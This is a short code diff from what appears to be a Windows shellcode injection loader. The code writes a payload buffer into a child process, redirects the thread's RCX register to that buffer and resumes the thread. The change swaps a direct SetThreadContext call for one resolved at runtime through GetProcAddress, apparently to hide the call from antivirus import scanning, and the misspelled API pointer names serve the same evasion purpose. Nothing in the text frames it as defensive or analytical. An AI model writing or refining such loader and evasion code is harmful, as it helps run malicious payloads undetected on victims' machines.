@@ -64,7 +64,9 @@ LPVOID (*pVirtualAllnocEkx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD) =
 
     pWriteProcessM(pi.hProcess, falpo, itsthecod345, sizeof(itsthecod345), NULL);
     cvx.Rcx = (DWORD64)falpo; 
-    SetThreadContext(pi.hThread, &cvx);
+
+    auto pSetThreadContext = (BOOL(WINAPI*)(HANDLE, LPCONTEXT))GetProcAddress(hKernel32, "SetThreadContext");
+    pSetThreadContext(pi.hThread, &cvx);
 
     ResumeThread(pi.hThread); 
 
